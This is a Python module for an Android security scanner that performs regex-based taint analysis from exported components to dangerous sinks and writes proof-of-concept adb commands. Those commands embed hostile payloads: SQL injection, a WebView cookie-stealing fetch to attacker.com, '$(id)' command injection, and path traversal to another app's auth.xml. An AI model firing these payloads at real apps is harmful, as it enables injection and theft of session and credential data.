"""
Source-Sink Taint Analysis Engine for Android (Jadx-decompiled Java source).

Performs 2-3 hop inter-procedural taint analysis to find confirmed data flows
from untrusted inputs (Intent extras, URI segments, ContentProvider args) to
dangerous sinks (SQL, WebView, exec, file, crypto).
"""

import os
import re
from collections import deque
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

from ..utils import Evidence, Finding


# ---------------------------------------------------------------------------
# Data-classes
# ---------------------------------------------------------------------------

@dataclass
class TaintSource:
    component_class: str      # e.g. "com.example.MainActivity"
    component_type: str       # "activity" | "service" | "receiver" | "provider"
    is_exported: bool
    method: str               # e.g. "onCreate"
    source_api: str           # e.g. "getStringExtra"
    extra_name: str           # e.g. "url" (the intent extra key, or "" when N/A)
    file_path: str
    line_number: int


@dataclass
class TaintSink:
    sink_class: str           # class containing the sink call
    sink_method: str          # method containing the sink call
    sink_api: str             # dangerous API called
    sink_type: str            # "sql" | "webview" | "exec" | "file" | "intent" | "crypto"
    severity: str             # "Critical" | "High" | "Medium"
    file_path: str
    line_number: int
    code_snippet: str


@dataclass
class TaintFlow:
    source: TaintSource
    sink: TaintSink
    hop_path: List[str]       # ["ComponentA.onCreate", "Helper.process", "DB.rawQuery"]
    is_sanitized: bool
    severity: str
    title: str
    description: str
    poc_command: str          # concrete adb command to test


@dataclass
class CallGraph:
    # (class, method) -> [(target_class, target_method, file, line)]
    edges: Dict[Tuple[str, str], List[Tuple[str, str, str, int]]] = field(
        default_factory=dict
    )
    # (class, method) -> full method body text
    method_bodies: Dict[Tuple[str, str], str] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# Sink definitions
# ---------------------------------------------------------------------------

_SINK_PATTERNS: List[Tuple[str, str, str]] = [
    # (regex, sink_type, severity)
    # SQL
    (r'\.\s*rawQuery\s*\(', "sql", "Critical"),
    (r'\.\s*execSQL\s*\(', "sql", "Critical"),
    (r'\.\s*compileStatement\s*\(', "sql", "High"),
    (r'\.\s*query\s*\([^)]*(?:selection|where)', "sql", "High"),
    # WebView
    (r'\.\s*loadUrl\s*\(', "webview", "Critical"),
    (r'\.\s*loadData\s*\(', "webview", "High"),
    (r'\.\s*loadDataWithBaseURL\s*\(', "webview", "High"),
    (r'\.\s*evaluateJavascript\s*\(', "webview", "Critical"),
    (r'\.\s*addJavascriptInterface\s*\(', "webview", "High"),
    # Command exec
    (r'Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(', "exec", "Critical"),
    (r'new\s+ProcessBuilder\s*\(', "exec", "Critical"),
    # File
    (r'new\s+FileOutputStream\s*\(', "file", "High"),
    (r'new\s+FileWriter\s*\(', "file", "High"),
    (r'new\s+File\s*\(', "file", "Medium"),
    # Intent forwarding
    (r'\.\s*startActivity\s*\(', "intent", "Medium"),
    (r'\.\s*sendBroadcast\s*\(', "intent", "Medium"),
    # Crypto with variable key
    (r'new\s+SecretKeySpec\s*\(', "crypto", "High"),
    (r'Cipher\s*\.\s*getInstance\s*\(', "crypto", "High"),
]

# Sink API display names keyed by regex prefix (used for labelling)
_SINK_DISPLAY: Dict[str, str] = {
    "rawQuery": "rawQuery",
    "execSQL": "execSQL",
    "compileStatement": "compileStatement",
    "query": "query(selection)",
    "loadUrl": "loadUrl",
    "loadData": "loadData",
    "loadDataWithBaseURL": "loadDataWithBaseURL",
    "evaluateJavascript": "evaluateJavascript",
    "addJavascriptInterface": "addJavascriptInterface",
    "exec": "Runtime.exec",
    "ProcessBuilder": "ProcessBuilder",
    "FileOutputStream": "FileOutputStream",
    "FileWriter": "FileWriter",
    "File(": "new File",
    "startActivity": "startActivity",
    "sendBroadcast": "sendBroadcast",
    "SecretKeySpec": "SecretKeySpec",
    "Cipher.getInstance": "Cipher.getInstance",
}

# Source API patterns: (regex, api_name, group_index_for_extra_name)
_SOURCE_PATTERNS: List[Tuple[str, str, int]] = [
    (r'\.get(\w+)Extra\s*\(\s*"([^"]+)"', "getExtra", 2),
    (r'\.getStringExtra\s*\(\s*"([^"]+)"', "getStringExtra", 1),
    (r'\.getIntExtra\s*\(\s*"([^"]+)"', "getIntExtra", 1),
    (r'\.getBooleanExtra\s*\(\s*"([^"]+)"', "getBooleanExtra", 1),
    (r'\.getData\s*\(\s*\)', "getData", 0),
    (r'\.getDataString\s*\(\s*\)', "getDataString", 0),
    (r'getQueryParameter\s*\(\s*"([^"]+)"', "getQueryParameter", 1),
    (r'getPathSegments\s*\(\s*\)', "getPathSegments", 0),
    (r'getLastPathSegment\s*\(\s*\)', "getLastPathSegment", 0),
    # ContentProvider – selection / selectionArgs arrive as method parameters
    (r'void\s+query\s*\([^)]*String\s+selection', "providerQuery", 0),
    (r'void\s+insert\s*\([^)]*ContentValues', "providerInsert", 0),
    (r'void\s+update\s*\([^)]*String\s+selection', "providerUpdate", 0),
]

# Sanitizer patterns – if any appear in the flow body, mark as sanitized
_SANITIZER_PATTERNS: List[str] = [
    r'Uri\.encode\s*\(',
    r'Pattern\.matches\s*\(',
    r'Matcher\.matches\s*\(',
    r'\.matches\s*\(',
    r'whitelist',
    r'allowlist',
    r'\.length\s*\(\s*\)\s*[<>]=?\s*\d+',
    r'TextUtils\.isEmpty\s*\(',
    r'StringUtils\.escape',
    r'DatabaseUtils\.sqlEscapeString',
    r'PreparedStatement',
    r'selectionArgs',        # parameterised SQL
]


# ---------------------------------------------------------------------------
# TaintEngine
# ---------------------------------------------------------------------------

class TaintEngine:
    """
    Inter-procedural source-to-sink taint analysis (max 3 hops).

    Works on Jadx-decompiled Java source files.  No real Java parser –
    regex is used throughout; results are conservative (may miss some flows
    or include false positives) but practical for security screening.
    """

    MAX_HOPS: int = 3

    def __init__(self, decompiled_root: str, manifest_data: dict):
        """
        Args:
            decompiled_root: Path to Jadx 'sources' directory (or parent).
            manifest_data: Dict produced by ReachabilityAnalyzer containing
                           components keyed by class name.
        """
        self.decompiled_root = decompiled_root
        self.manifest_data = manifest_data  # {class_name: ComponentInfo}
        self._sources_dir = self._resolve_sources_dir()
        self._package_name: str = manifest_data.get("_package", "")

        # Populated during analysis
        self._call_graph: Optional[CallGraph] = None
        # (class, method) -> file/line info for the method signature
        self._method_locations: Dict[Tuple[str, str], Tuple[str, int]] = {}
        # class -> set of imported fully-qualified names
        self._class_imports: Dict[str, Dict[str, str]] = {}
        # simple class name -> fully qualified name
        self._class_fqn_map: Dict[str, str] = {}

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def analyze(self) -> List[TaintFlow]:
        """Run full taint analysis and return all confirmed source→sink flows."""
        self._call_graph = self._build_call_graph()
        sources = self._find_taint_sources()
        sinks = self._find_sinks()

        flows: List[TaintFlow] = []
        seen: Set[str] = set()

        for source in sources:
            for flow in self._trace_taint(source, sinks, self._call_graph):
                key = (
                    f"{flow.source.component_class}.{flow.source.method}"
                    f"|{flow.sink.sink_class}.{flow.sink.sink_method}"
                    f"|{flow.sink.sink_api}"
                )
                if key not in seen:
                    seen.add(key)
                    flow.is_sanitized = self._check_sanitizers(flow)
                    flows.append(flow)

        return flows

    # ------------------------------------------------------------------
    # Call graph construction
    # ------------------------------------------------------------------

    def _resolve_sources_dir(self) -> str:
        """Locate the Java sources root within the decompiled directory."""
        candidates = [
            os.path.join(self.decompiled_root, "sources"),
            os.path.join(self.decompiled_root, "src"),
            self.decompiled_root,
        ]
        for c in candidates:
            if os.path.isdir(c):
                return c
        return self.decompiled_root

    def _build_call_graph(self) -> CallGraph:
        """
        Walk every .java file; extract method definitions and intra-/inter-class
        call sites.  Build the CallGraph edge map.
        """
        cg = CallGraph()

        for java_file in self._iter_java_files():
            try:
                self._process_java_file(java_file, cg)
            except Exception:
                # Gracefully skip files that cannot be parsed
                pass

        return cg

    def _iter_java_files(self):
        """Yield all .java file paths under sources dir."""
        for root, _, files in os.walk(self._sources_dir):
            for fname in files:
                if fname.endswith(".java"):
                    yield os.path.join(root, fname)

    def _process_java_file(self, file_path: str, cg: CallGraph):
        """Parse a single .java file and update the call graph."""
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read()
        except OSError:
            return

        lines = content.splitlines()

        # ── Extract package and class name ─────────────────────────────
        package = self._extract_package(content)
        class_name = self._extract_class_name(content, file_path)
        if not class_name:
            return

        fqn = f"{package}.{class_name}" if package else class_name
        self._class_fqn_map[class_name] = fqn

        # ── Extract imports (simple_name -> fqn) ──────────────────────
        imports = self._extract_imports(content)
        self._class_imports[fqn] = imports

        # ── Extract method definitions with bodies ────────────────────
        methods = self._extract_methods(content, lines, fqn, file_path)

        for method_name, body, start_line in methods:
            key = (fqn, method_name)
            cg.method_bodies[key] = body
            self._method_locations.setdefault(key, (file_path, start_line))

            # ── Find call sites inside this method body ────────────────
            call_sites = self._extract_call_sites(body, start_line, imports, fqn)
            if call_sites:
                cg.edges.setdefault(key, []).extend(call_sites)

    def _extract_package(self, content: str) -> str:
        m = re.search(r'^\s*package\s+([\w.]+)\s*;', content, re.MULTILINE)
        return m.group(1) if m else ""

    def _extract_class_name(self, content: str, file_path: str) -> str:
        """Extract primary class name; fall back to filename."""
        m = re.search(
            r'(?:public\s+)?(?:abstract\s+)?(?:final\s+)?class\s+(\w+)',
            content
        )
        if m:
            return m.group(1)
        # Fall back to filename
        return os.path.splitext(os.path.basename(file_path))[0]

    def _extract_imports(self, content: str) -> Dict[str, str]:
        """Return {simple_name: fqn} for all import statements."""
        result: Dict[str, str] = {}
        for m in re.finditer(r'^\s*import\s+([\w.]+)\s*;', content, re.MULTILINE):
            fqn = m.group(1)
            simple = fqn.split(".")[-1]
            result[simple] = fqn
        return result

    def _extract_methods(
        self,
        content: str,
        lines: List[str],
        class_fqn: str,
        file_path: str,
    ) -> List[Tuple[str, str, int]]:
        """
        Extract (method_name, body_text, start_line_number) for every method.

        Uses brace-counting to delimit method bodies.
        """
        results: List[Tuple[str, str, int]] = []

        method_pattern = re.compile(
            r'(?:(?:public|private|protected|static|final|synchronized|abstract|native|default)\s+)*'
            r'(?:<[^>]*>\s*)?'          # optional generic return type
            r'(?:[\w\[\]<>,\s]+\s+)?'  # return type (permissive)
            r'(\w+)\s*\('               # method name + opening paren
            r'[^)]*\)\s*'               # parameters
            r'(?:throws\s+[\w,\s]+)?\s*'
            r'\{',                      # opening brace
            re.MULTILINE,
        )

        for m in method_pattern.finditer(content):
            method_name = m.group(1)
            # Filter out known non-method keywords
            if method_name in {
                "if", "while", "for", "switch", "try", "catch",
                "else", "do", "synchronized", "new", "return",
                "class", "interface", "enum",
            }:
                continue

            # Locate opening brace
            brace_pos = content.find("{", m.start())
            if brace_pos == -1:
                continue

            start_line = content[:m.start()].count("\n") + 1

            # Count braces to find matching close
            depth = 1
            pos = brace_pos + 1
            while pos < len(content) and depth > 0:
                ch = content[pos]
                if ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                pos += 1

            body = content[brace_pos:pos]
            results.append((method_name, body, start_line))

        return results

    def _extract_call_sites(
        self,
        body: str,
        body_start_line: int,
        imports: Dict[str, str],
        current_class_fqn: str,
    ) -> List[Tuple[str, str, str, int]]:
        """
        Find all method calls in a method body.

        Returns list of (target_class_fqn, target_method, file_placeholder, line).
        """
        results: List[Tuple[str, str, str, int]] = []
        # Pattern: object.method( or ClassName.method(
        call_pattern = re.compile(r'(\w+)\s*\.\s*(\w+)\s*\(')
        body_lines = body.splitlines()

        for line_idx, line in enumerate(body_lines):
            stripped = line.strip()
            # Skip comment lines
            if stripped.startswith("//") or stripped.startswith("*"):
                continue

            for cm in call_pattern.finditer(line):
                obj_or_class = cm.group(1)
                called_method = cm.group(2)
                abs_line = body_start_line + line_idx

                # Skip common keywords that look like identifiers
                if obj_or_class in {
                    "return", "new", "if", "else", "while", "for",
                    "throw", "catch", "super", "this",
                }:
                    continue

                # Resolve target class
                resolved = imports.get(obj_or_class)
                if resolved is None:
                    # Could be same package or an in-scope variable; use simple name
                    resolved = self._class_fqn_map.get(
                        obj_or_class, f"{current_class_fqn}#{obj_or_class}"
                    )

                results.append((resolved, called_method, "", abs_line))

        return results

    # ------------------------------------------------------------------
    # Taint sources
    # ------------------------------------------------------------------

    def _find_taint_sources(self) -> List[TaintSource]:
        """
        Find all reads from untrusted external sources within exported components.
        """
        sources: List[TaintSource] = []
        exported_classes = self._get_exported_classes()

        for java_file in self._iter_java_files():
            try:
                with open(java_file, "r", encoding="utf-8", errors="ignore") as fh:
                    content = fh.read()
            except OSError:
                continue

            package = self._extract_package(content)
            class_simple = self._extract_class_name(content, java_file)
            fqn = f"{package}.{class_simple}" if package else class_simple

            comp_info = exported_classes.get(fqn) or exported_classes.get(class_simple)
            if comp_info is None:
                continue

            comp_type, is_exported = comp_info

            lines = content.splitlines()
            current_method = "unknown"

            # Track which method we are currently inside (simple heuristic)
            method_decl_re = re.compile(
                r'(?:public|private|protected|static|final|synchronized|override)\s+'
                r'(?:[\w<>\[\],\s]+\s+)?(\w+)\s*\('
            )

            for line_no, line in enumerate(lines, start=1):
                md = method_decl_re.search(line)
                if md and md.group(1) not in {
                    "if", "while", "for", "catch", "new", "return"
                }:
                    current_method = md.group(1)

                for src_pattern, api_name, extra_grp in _SOURCE_PATTERNS:
                    for sm in re.finditer(src_pattern, line):
                        extra_name = ""
                        if extra_grp > 0:
                            try:
                                extra_name = sm.group(extra_grp)
                            except IndexError:
                                extra_name = ""

                        sources.append(TaintSource(
                            component_class=fqn,
                            component_type=comp_type,
                            is_exported=is_exported,
                            method=current_method,
                            source_api=api_name,
                            extra_name=extra_name,
                            file_path=java_file,
                            line_number=line_no,
                        ))

        return sources

    def _get_exported_classes(self) -> Dict[str, Tuple[str, bool]]:
        """
        Return {fqn: (component_type, is_exported)} for all exported components.

        Handles two manifest_data formats:
        1. Scanner format: {'activities': [{'name': fqn, 'exported': bool, ...}], ...}
        2. Legacy format:  {'com.example.Foo': {'component_type': ..., 'exported': ...}}
        """
        result: Dict[str, Tuple[str, bool]] = {}

        # Format 1 — scanner's list-based manifest_data (preferred)
        for comp_type in ("activities", "services", "receivers", "providers"):
            type_key = comp_type.rstrip("s")  # activity/service/receiver/provider
            for entry in self.manifest_data.get(comp_type, []):
                if not isinstance(entry, dict):
                    continue
                name = entry.get("name", "")
                if not name:
                    continue
                exported = bool(entry.get("exported", False))
                result[name] = (type_key, exported)
                simple = name.split(".")[-1]
                result.setdefault(simple, (type_key, exported))

        if result:
            return result

        # Format 2 — legacy class-name keyed dict
        for name, info in self.manifest_data.items():
            if name.startswith("_") or name in ("package", "activities",
                                                  "services", "receivers", "providers"):
                continue
            if hasattr(info, "component_type"):
                comp_type = info.component_type
                exported = bool(info.exported)
            elif isinstance(info, dict):
                comp_type = info.get("component_type", "activity")
                exported = bool(info.get("exported", False))
            else:
                continue
            result[name] = (comp_type, exported)
            simple = name.split(".")[-1]
            result.setdefault(simple, (comp_type, exported))

        return result

    # ------------------------------------------------------------------
    # Taint sinks
    # ------------------------------------------------------------------

    def _find_sinks(self) -> List[TaintSink]:
        """Find all dangerous API call sites in all Java files."""
        sinks: List[TaintSink] = []

        for java_file in self._iter_java_files():
            try:
                with open(java_file, "r", encoding="utf-8", errors="ignore") as fh:
                    content = fh.read()
            except OSError:
                continue

            package = self._extract_package(content)
            class_simple = self._extract_class_name(content, java_file)
            fqn = f"{package}.{class_simple}" if package else class_simple

            lines = content.splitlines()
            current_method = "unknown"

            method_decl_re = re.compile(
                r'(?:public|private|protected|static|final|synchronized|override)\s+'
                r'(?:[\w<>\[\],\s]+\s+)?(\w+)\s*\('
            )

            for line_no, line in enumerate(lines, start=1):
                md = method_decl_re.search(line)
                if md and md.group(1) not in {
                    "if", "while", "for", "catch", "new", "return"
                }:
                    current_method = md.group(1)

                for sink_regex, sink_type, severity in _SINK_PATTERNS:
                    if re.search(sink_regex, line):
                        api_name = self._label_sink(sink_regex)
                        snippet = self._build_snippet(lines, line_no)

                        sinks.append(TaintSink(
                            sink_class=fqn,
                            sink_method=current_method,
                            sink_api=api_name,
                            sink_type=sink_type,
                            severity=severity,
                            file_path=java_file,
                            line_number=line_no,
                            code_snippet=snippet,
                        ))

        return sinks

    def _label_sink(self, sink_regex: str) -> str:
        """Extract a readable sink API name from the regex."""
        for key, label in _SINK_DISPLAY.items():
            if key in sink_regex:
                return label
        # Fallback: pull first word-group from regex
        m = re.search(r'\\?\w+', sink_regex)
        return m.group(0).replace("\\", "") if m else sink_regex[:30]

    @staticmethod
    def _build_snippet(lines: List[str], line_no: int, ctx: int = 2) -> str:
        start = max(0, line_no - 1 - ctx)
        end = min(len(lines), line_no - 1 + ctx + 1)
        return "\n".join(
            f"{i + 1:04d}: {lines[i]}" for i in range(start, end)
        )

    # ------------------------------------------------------------------
    # Taint propagation (BFS, max 3 hops)
    # ------------------------------------------------------------------

    def _trace_taint(
        self,
        source: TaintSource,
        sinks: List[TaintSink],
        call_graph: CallGraph,
    ) -> List[TaintFlow]:
        """
        BFS from the source component+method through the call graph.
        Returns flows that reach a known sink within MAX_HOPS hops.
        """
        flows: List[TaintFlow] = []

        # Build a fast lookup: (sink_class, sink_method) -> [TaintSink]
        sink_index: Dict[Tuple[str, str], List[TaintSink]] = {}
        for sk in sinks:
            key = (sk.sink_class, sk.sink_method)
            sink_index.setdefault(key, []).append(sk)

        # BFS state: (class_fqn, method_name, hop_path_so_far)
        start_key = (source.component_class, source.method)
        queue: deque = deque()
        queue.append((start_key, [f"{source.component_class}.{source.method}"]))
        visited: Set[Tuple[str, str]] = {start_key}

        while queue:
            current, path = queue.popleft()

            # Check if this node is a sink location
            matching_sinks = sink_index.get(current, [])
            for sk in matching_sinks:
                flow = self._build_flow(source, sk, path)
                flows.append(flow)

            if len(path) > self.MAX_HOPS:
                continue

            # Explore callees
            for target_class, target_method, _file, _line in call_graph.edges.get(
                current, []
            ):
                next_key = (target_class, target_method)
                if next_key not in visited:
                    visited.add(next_key)
                    next_path = path + [f"{target_class}.{target_method}"]
                    queue.append((next_key, next_path))

        return flows

    def _build_flow(
        self, source: TaintSource, sink: TaintSink, path: List[str]
    ) -> TaintFlow:
        """Construct a TaintFlow from source, sink and traversal path."""
        severity = sink.severity

        # Escalate severity for exported components flowing to critical sinks
        if source.is_exported and sink.severity == "High":
            severity = "Critical"

        # Build a human-readable title
        src_label = (
            f"{source.extra_name!r} extra" if source.extra_name else source.source_api
        )
        title = (
            f"Taint flow: {source.component_type.capitalize()} "
            f"'{source.component_class.split('.')[-1]}' "
            f"{src_label} → {sink.sink_api} [{sink.sink_type.upper()}]"
        )

        hops_str = " → ".join(path)
        description = (
            f"Tainted data from {source.source_api}({src_label}) in exported "
            f"{source.component_type} '{source.component_class}' flows to "
            f"{sink.sink_api} in '{sink.sink_class}.{sink.sink_method}' via: "
            f"{hops_str}.\n\n"
            f"Sink code ({sink.file_path}:{sink.line_number}):\n"
            f"{sink.code_snippet}"
        )

        poc = self._build_poc(source, sink)

        return TaintFlow(
            source=source,
            sink=sink,
            hop_path=path,
            is_sanitized=False,  # updated later by _check_sanitizers
            severity=severity,
            title=title,
            description=description,
            poc_command=poc,
        )

    def _build_poc(self, source: TaintSource, sink: TaintSink) -> str:
        """Generate a concrete adb command to test the flow."""
        pkg = self._package_name
        comp = source.component_class

        # Build component selector
        comp_short = comp.split(".")[-1]
        if pkg and comp.startswith(pkg):
            selector = f"{pkg}/.{comp_short}"
        elif pkg:
            selector = f"{pkg}/{comp}"
        else:
            selector = comp

        extra_name = source.extra_name or "data"

        if sink.sink_type == "sql":
            payload = "' OR '1'='1"
            extra_flag = f'--es "{extra_name}" "{payload}"'
        elif sink.sink_type == "webview":
            payload = "javascript:fetch('https://attacker.com/?c='+document.cookie)"
            extra_flag = f'--es "{extra_name}" "{payload}"'
        elif sink.sink_type == "exec":
            payload = "$(id)"
            extra_flag = f'--es "{extra_name}" "{payload}"'
        elif sink.sink_type == "file":
            payload = "../../../../../../data/data/com.target.app/shared_prefs/auth.xml"
            extra_flag = f'--es "{extra_name}" "{payload}"'
        else:
            payload = "attacker_controlled_value"
            extra_flag = f'--es "{extra_name}" "{payload}"'

        if source.component_type == "activity":
            cmd = f"adb shell am start -n {selector} {extra_flag}"
        elif source.component_type == "service":
            cmd = f"adb shell am startservice -n {selector} {extra_flag}"
        elif source.component_type == "receiver":
            actions = ""
            cmd = f"adb shell am broadcast -n {selector} {extra_flag}"
        elif source.component_type == "provider":
            authority = pkg if pkg else "com.example"
            if sink.sink_type == "sql":
                cmd = (
                    f'adb shell content query --uri content://{authority}/ '
                    f'--where "\' OR \'1\'=\'1"'
                )
            else:
                cmd = (
                    f'adb shell content query --uri content://{authority}/{payload}'
                )
        else:
            cmd = f"adb shell am start -n {selector} {extra_flag}"

        return cmd

    # ------------------------------------------------------------------
    # Sanitizer detection
    # ------------------------------------------------------------------

    def _check_sanitizers(self, flow: TaintFlow) -> bool:
        """
        Return True if the flow path contains a sanitizer that clears the taint.

        Checks each method body along the hop path for known sanitizer patterns.
        """
        if self._call_graph is None:
            return False

        for hop in flow.hop_path:
            parts = hop.rsplit(".", 1)
            if len(parts) != 2:
                continue
            cls, meth = parts
            body = self._call_graph.method_bodies.get((cls, meth), "")
            for san_pattern in _SANITIZER_PATTERNS:
                if re.search(san_pattern, body, re.IGNORECASE):
                    return True

        return False


# ---------------------------------------------------------------------------
# Conversion to Finding
# ---------------------------------------------------------------------------

def to_finding(flow: TaintFlow) -> Finding:
    """Convert a TaintFlow to the standard Finding dataclass."""
    hops_formatted = " → ".join(flow.hop_path)
    extra = {
        "taint_flow": True,
        "hop_path": flow.hop_path,
        "source_api": flow.source.source_api,
        "sink_api": flow.sink.sink_api,
        "sink_type": flow.sink.sink_type,
        "is_sanitized": flow.is_sanitized,
        "extra_name": flow.source.extra_name,
    }

    sanitized_note = " [SANITIZED – may be FP]" if flow.is_sanitized else ""
    fid = (
        f"TAINT_{flow.sink.sink_type.upper()}_"
        f"{flow.source.component_class.split('.')[-1].upper()}"
    )

    attack_path = (
        f"Exported {flow.source.component_type} receives untrusted input via "
        f"{flow.source.source_api}({flow.source.extra_name!r}) → "
        f"data propagates through {len(flow.hop_path)} hop(s) → "
        f"reaches {flow.sink.sink_api} sink ({flow.sink.sink_type}).\n"
        f"Call chain: {hops_formatted}"
    )

    evidence = Evidence(
        file_path=flow.sink.file_path,
        line_number=flow.sink.line_number,
        snippet=flow.sink.code_snippet,
        matched_text=flow.sink.sink_api,
    )

    return Finding(
        fid=fid,
        title=flow.title + sanitized_note,
        severity=flow.severity,
        description=flow.description,
        attack_path=attack_path,
        adb_commands=[flow.poc_command],
        evidence=evidence,
        references=[
            "https://owasp.org/www-project-mobile-top-10/",
            "https://developer.android.com/topic/security/risks/intent-injection",
        ],
        extra=extra,
    )
